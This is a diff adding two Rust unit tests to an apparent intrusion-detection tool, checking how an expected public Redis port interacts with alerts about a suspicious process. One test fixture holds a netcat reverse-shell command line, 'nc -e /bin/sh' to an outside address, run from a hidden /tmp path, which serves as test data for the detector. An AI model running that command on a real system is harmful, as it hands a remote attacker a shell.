@@ -260,6 +260,33 @@ fn reports_high_risk_public_port_from_current_state() {
 }
 
 #[test]
+fn expected_high_risk_public_port_suppresses_exposure_only_alert() {
+    let mut config = SentinelConfig::default();
+    config.network.expected_public_ports.push(6379);
+    let findings = detect(config, vec![socket_event("network", 6379)]);
+    assert!(findings.is_empty());
+}
+
+#[test]
+fn expected_high_risk_public_port_still_reports_suspicious_owner() {
+    let mut config = SentinelConfig::default();
+    config.network.expected_public_ports.push(6379);
+    let findings = detect(
+        config,
+        vec![RawEvent::new("network", "listening_socket")
+            .with_field("protocol", "tcp")
+            .with_field("local_addr", "0.0.0.0")
+            .with_field("local_port", "6379")
+            .with_field("process_name", "sh")
+            .with_field("executable", "/tmp/.x/sh")
+            .with_field("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444")],
+    );
+
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-003");
+}
+
+#[test]
 fn coalesces_dual_stack_high_risk_public_port() {
     let findings = detect_with_default_config(vec![
         RawEvent::new("network", "listening_socket")
